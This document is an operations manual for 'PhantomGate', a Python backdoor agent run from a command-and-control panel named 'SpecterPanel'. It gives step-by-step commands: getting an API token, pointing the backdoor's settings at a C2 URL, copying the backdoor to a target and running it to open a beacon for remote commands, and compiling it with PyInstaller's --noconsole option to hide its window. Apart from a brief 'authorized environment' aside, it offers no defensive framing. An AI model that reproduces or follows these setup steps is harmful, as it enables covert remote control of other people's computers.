DEPLOYMENT MANUAL

PhantomGate Setup

Step-by-step guide to deploy your first agent.

1

Token Acquisition

Log into SpecterPanel and navigate to Settings → API Token. Generate a fresh token.

$ curl -X POST https://your-panel.com/api/token/generate -H "Authorization: Bearer <master_key>"

⚠️ Store token in environment variables. Rotate every 72h.

2

Configure PhantomGate

Edit backdoor/setting.py and update:

  • self.API_TOKEN – your token from step 1
  • self.url – your SpecterPanel URL (e.g., https://c2.domain.com)
  • self.ENCRYPTION_KEY – generate new 16-byte key (optional but recommended)
self.API_TOKEN = "sp_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
self.url = "https://your-panel.com"
3

Deploy & Activate

Transfer the backdoor/ folder to the target (authorized environment). Ensure Python 3.9+ is present.

$ cd backdoor
$ python3 phantomgate.py
[+] Connecting to SpecterPanel...
[+] Beacon established. Agent ID: 7f3a9c2e

Once running, the agent appears in the panel. Issue commands remotely.

4

(Optional) Compile Standalone

Use PyInstaller to create a single executable:

$ pip install pyinstaller
$ cd backdoor
$ pyinstaller --onefile --noconsole phantomgate.py
$ ls dist/ # phantomgate.exe (Windows) or phantomgate (Linux/macOS)

Use --noconsole to hide the window on Windows.
